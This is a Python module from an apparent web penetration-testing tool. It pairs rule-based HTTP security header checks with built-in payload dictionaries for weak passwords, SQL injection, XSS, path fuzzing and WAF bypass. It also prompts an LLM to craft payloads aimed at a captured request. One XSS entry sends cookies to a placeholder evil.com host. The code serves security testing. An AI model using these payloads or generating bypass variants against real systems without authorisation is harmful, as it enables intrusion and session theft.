"""AI 服务：流量分析、payload 生成。

当未配置 LLM API Key 时，使用内置 fallback 字典/规则，
保证工具在离线状态下仍可正常使用基础功能。
"""

import json
from sqlalchemy.orm import Session

from hemlock.models.flow import Flow
from hemlock.core.config import settings
from hemlock.core.llm_client import chat_json


# ===== 内置 fallback payload 字典 =====
_FALLBACK_PAYLOADS: dict[str, list[str]] = {
    "weak_password": [
        "admin", "password", "123456", "admin123", "root",
        "admin@123", "test", "guest", "user", "pass",
        "password123", "admin1", "root123", "12345678",
        "qwerty", "abc123", "letmein", "welcome", "monkey",
        "master", "dragon", "login", "princess", "football",
        "shadow", "sunshine", "trustno1", "iloveyou", "batman",
        "1234567890", "123456789", "12345", "1234567",
        "admin2024", "admin2025", "P@ssw0rd", "p@ssword",
        "changeme", "secret", "default", "test123", "guest123",
        "administrator", "manager", "operator", "backup",
        "support", "service", "info", "help", "webmaster",
    ],
    "sqli": [
        "'", "''", "' OR '1'='1", "' OR '1'='1' --",
        "' OR '1'='1' /*", "' OR 1=1 --", "' OR 1=1 #",
        "1' OR '1'='1", "1 OR 1=1", "1) OR 1=1 --",
        "' UNION SELECT NULL --", "' UNION SELECT NULL,NULL --",
        "' AND 1=1 --", "' AND 1=2 --",
        "'; WAITFOR DELAY '0:0:5' --",
        "' AND SLEEP(5) --", "' AND BENCHMARK(5000000,MD5(1)) --",
        "1' AND SLEEP(5) --", "1; WAITFOR DELAY '0:0:5' --",
        "' OR ''='", "admin'--", "admin' #",
        "' OR 1=1 LIMIT 1 --", "' OR 1=1 INTO OUTFILE '/tmp/1' --",
        "1' UNION SELECT database() --",
        "1' UNION SELECT version() --",
        "1' UNION SELECT user() --",
        "' OR 1=1 AND '1'='1",
        "\\", "\\\\", "%27", "%27%20OR%20%271%27%3D%271",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "javascript:alert(1)",
        "'\"><script>alert(1)</script>",
        "<scr<script>ipt>alert(1)</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "<svg/onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "';alert(String.fromCharCode(88,83,83))//",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<a href=javascript:alert(1)>click</a>",
        "<form action=javascript:alert(1)><input type=submit>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<script>document.cookie</script>",
        "<script>fetch('https://evil.com?c='+document.cookie)</script>",
        "<img src=x onerror='alert(document.domain)'>",
        "javascript:void(0)",
        "data:text/html,<script>alert(1)</script>",
        "<svg><animate onbegin=alert(1)>",
    ],
    "fuzz": [
        "admin", "test", "debug", "backup", "old",
        "config", "api", "v1", "v2", "internal",
        "secret", "private", "hidden", "temp", "tmp",
        ".env", ".git", ".svn", ".htaccess", "web.config",
        "robots.txt", "sitemap.xml", ".well-known",
        "wp-admin", "wp-login", "phpmyadmin", "adminer",
        "console", "shell", "cmd", "exec", "system",
        "flag", "flag.txt", "id_rsa", "passwd", "shadow",
        "WEB-INF", "META-INF", "crossdomain.xml",
        ".DS_Store", "Thumbs.db", "error.log", "access.log",
        "1", "0", "true", "false", "null", "undefined",
        "{{7*7}}", "${7*7}", "<%=7*7%>", "#{7*7}",
        "../../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
    ],
    "waf_bypass": [
        "1' OR 1=1 --",
        "1'/**/OR/**/1=1/**/--",
        "1' OORR 1=1 --",
        "1'%20OR%201=1%20--",
        "1' UNION SELECT",
        "1' UNUNIONION SELSELECTECT",
        "1' UniON SeLeCt",
        "1' /*!UNION*/ /*!SELECT*/",
        "1' UNION%0aSELECT",
        "1' UNION%0bSELECT",
        "1' UNION%0cSELECT",
        "1' UNION%09SELECT",
        "1'%0aUNION%0aSELECT",
        "0x31 OR 0x31=0x31",
        "CHAR(49) OR CHAR(49)=CHAR(49)",
        "1' OR 1=1 LIMIT 1",
        "1' OR 1=1 INTO @",
        "<scr<script>ipt>",
        "<svg/onload=alert(1)>",
        "<img/src=x/onerror=alert(1)>",
        "javascript:/*</script><svg/onload=alert(1)>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    ],
}


def _has_llm(db: Session | None = None) -> bool:
    """检查是否配置了 LLM API Key：.env 或数据库 Provider（UI 配置）。"""
    if settings.llm_api_key:
        return True
    if db:
        try:
            from hemlock.models.llm_provider import LLMProvider
            return db.query(LLMProvider).first() is not None
        except Exception:
            pass
    return False


def analyze_flow(db: Session, flow_id: str, question: str | None = None) -> dict:
    """分析指定流量，给出安全建议。

    无 LLM 时使用基于规则的基础分析。
    """
    flow = db.query(Flow).filter(Flow.id == flow_id).first()
    if not flow:
        return {"error": "flow not found"}

    if not _has_llm(db):
        return _fallback_analyze(flow, question)

    q = question or "分析这个 HTTP 请求响应，是否存在安全问题？给出风险等级和测试建议。"

    prompt = f"""你是 Web 安全测试专家。分析以下 HTTP 流量，判断是否存在安全风险。

请求：
{flow.method} {flow.url}
{flow.req_headers}

{flow.req_body}

响应状态：{flow.resp_status}
响应头：
{flow.resp_headers}

响应体：
{flow.resp_body[:2000]}

问题：{q}

请以 JSON �装：{{"analysis": "分析说明", "risk_level": "critical|high|medium|low|info", "suggestions": ["建议1", "建议2"]}}"""

    result = chat_json(
        [
            {"role": "system", "content": "你是专业的 Web 安全测试专家，擅长发现 HTTP 流量中的安全风险。"},
            {"role": "user", "content": prompt},
        ],
        db=db,  # 使用数据库 Provider（UI 配置）
    )

    try:
        data = json.loads(result)
    except json.JSONDecodeError:
        data = {"analysis": result, "risk_level": "info", "suggestions": []}

    data["flow_id"] = flow_id
    return data


def _fallback_analyze(flow: Flow, question: str | None = None) -> dict:
    """基于规则的基础流量分析（无需 LLM）。"""
    findings: list[str] = []
    suggestions: list[str] = []
    risk = "info"

    # 检查 HTTPS
    if flow.url.startswith("http://"):
        findings.append("请求使用明文 HTTP 协议，传输内容可被中间人截获。")
        risk = "medium"
        suggestions.append("使用 HTTPS 协议加密传输。")

    # 检查响应头安全配置
    resp_headers_lower = (flow.resp_headers or "").lower()
    if "x-frame-options" not in resp_headers_lower:
        findings.append("响应缺少 X-Frame-Options 头，可能存在 Clickjacking 风险。")
        if risk == "info":
            risk = "low"
        suggestions.append("添加 X-Frame-Options: DENY 或 SAMEORIGIN 响应头。")

    if "x-content-type-options" not in resp_headers_lower:
        findings.append("响应缺少 X-Content-Type-Options 头，浏览器可能进行 MIME 嗅探。")
        if risk == "info":
            risk = "low"
        suggestions.append("添加 X-Content-Type-Options: nosniff 响应头。")

    if "strict-transport-security" not in resp_headers_lower and flow.url.startswith("https://"):
        findings.append("响应缺少 Strict-Transport-Security 头，无法防止协议降级攻击。")
        if risk == "info":
            risk = "low"
        suggestions.append("添加 HSTS 响应头: Strict-Transport-Security: max-age=31536000; includeSubDomains")

    if "content-security-policy" not in resp_headers_lower:
        findings.append("响应缺少 Content-Security-Policy 头，XSS 防护较弱。")
        if risk == "info":
            risk = "low"
        suggestions.append("配置 CSP 策略限制资源加载来源。")

    # 检查 Cookie 安全
    if "set-cookie" in resp_headers_lower:
        if "httponly" not in resp_headers_lower:
            findings.append("Cookie 未设置 HttpOnly 标志，可被 JavaScript 读取，存在 XSS 窃取风险。")
            risk = "medium" if risk in ("info", "low") else risk
            suggestions.append("为所有 Cookie 设置 HttpOnly 标志。")
        if "secure" not in resp_headers_lower and flow.url.startswith("https://"):
            findings.append("Cookie 未设置 Secure 标志，可能在 HTTP 连接中泄露。")
            suggestions.append("为所有 Cookie 设置 Secure 标志。")

    # 检查请求中的敏感参数
    req_combined = f"{flow.url} {flow.req_headers} {flow.req_body}"
    sensitive_params = ["password", "passwd", "pwd", "secret", "token", "apikey", "api_key"]
    for param in sensitive_params:
        if param in req_combined.lower():
            findings.append(f"请求中包含敏感参数 '{param}'，请确认是否通过加密通道传输。")
            if risk == "info":
                risk = "low"
            break

    # 检查错误信息泄露
    resp_body_lower = (flow.resp_body or "").lower()
    error_patterns = ["stack trace", "exception", "sql error", "mysql", "postgresql",
                      "ora-", "microsoft sql server", "debug info", "php warning"]
    for pattern in error_patterns:
        if pattern in resp_body_lower:
            findings.append(f"响应体中包含错误信息（匹配: {pattern}），可能泄露服务器技术栈和路径。")
            risk = "medium" if risk in ("info", "low") else risk
            suggestions.append("生产环境关闭详细错误信息，使用自定义错误页面。")
            break

    # 检查状态码
    if flow.resp_status and flow.resp_status >= 500:
        findings.append(f"服务器返回 {flow.resp_status} 错误，可能存在服务端异常或安全漏洞。")
        risk = "medium" if risk in ("info", "low") else risk
        suggestions.append("排查 5xx 错误根因，检查是否可触发服务端异常获取信息。")

    if not findings:
        findings.append("未发现明显安全问题（基础规则检查）。建议使用 AI 深度分析获取更详细的结果。")
        suggestions.append("配置 LLM API Key 以启用 AI 深度分析功能。")
        suggestions.append("使用 Repeater 修改请求参数进行手动测试。")
        suggestions.append("使用 Intruder 对关键参数进行批量 fuzz 测试。")

    analysis_text = "；".join(findings) if findings else "未发现明显安全问题。"

    return {
        "flow_id": flow.id,
        "analysis": f"[基础规则分析] {analysis_text}",
        "risk_level": risk,
        "suggestions": suggestions,
    }


def generate_payloads(
    scene: str, context: str, count: int,
    method: str = "", url: str = "",
    headers: str = "", body: str = "",
    db: Session | None = None,
) -> dict:
    """根据场景生成 payload 字典。

    无 LLM 时返回内置 fallback 字典。
    有 LLM 时，传入完整请求上下文让 AI 生成针对性 payload。
    """
    if not _has_llm(db):
        payloads = _FALLBACK_PAYLOADS.get(scene, _FALLBACK_PAYLOADS["fuzz"])
        return {"scene": scene, "payloads": payloads[:count]}

    scene_desc = {
        "weak_password": "弱口令字典，常见用户名密码组合",
        "sqli": "SQL 注入测试 payload，包括基于错误、盲注、时间盲注",
        "xss": "XSS 测试 payload，包括反射型、存储型、DOM 型",
        "fuzz": "通用 fuzz 字典，用于发现隐藏参数或路径",
        "waf_bypass": "WAF 绕过变异 payload，编码、大小写、注释等技巧",
    }

    desc = scene_desc.get(scene, scene)

    # 构建完整请求上下文（让 AI 了解目标参数和结构）
    request_context = ""
    if url:
        request_context += f"目标 URL: {url}\n"
    if method:
        request_context += f"请求方法: {method}\n"
    if headers:
        # 只取关键头部，避免过长
        key_headers = []
        for line in headers.split("\n"):
            lower = line.lower().strip()
            if any(k in lower for k in ["content-type", "cookie", "authorization", "host", "user-agent", "referer", "x-"]):
                key_headers.append(line.strip())
        if key_headers:
            request_context += f"关键请求头:\n{chr(10).join(key_headers)}\n"
    if body:
        # 截断过长的 body
        truncated_body = body[:2000] if len(body) > 2000 else body
        request_context += f"请求体:\n{truncated_body}\n"
    if context:
        request_context += f"额外上下文: {context}\n"

    prompt = f"""生成 {count} 条用于 {desc} 的 payload 列表。

请根据以下请求上下文，生成针对该请求中实际参数的 payload。分析请求中的参数名、参数值、Content-Type 等，生成有针对性的测试 payload。

{request_context}

要求：
1. payload 应针对请求中的实际参数和路径
2. 根据参数值类型选择合适的 payload（数字型/字符型/JSON 等）
3. 包含常见绕过变体
4. 每个 payload 独立一行

以 JSON 返回：{{"payloads": ["payload1", "payload2", ...]}}"""

    result = chat_json(
        [
            {"role": "system", "content": "你是 Web 安全测试专家，擅长根据目标请求上下文生成精准的 payload 字典。只返回 JSON。"},
            {"role": "user", "content": prompt},
        ],
        db=db,  # 使用数据库 Provider（UI 配置）
    )

    try:
        data = json.loads(result)
    except json.JSONDecodeError:
        data = {"payloads": []}

    return {"scene": scene, "payloads": data.get("payloads", [])}
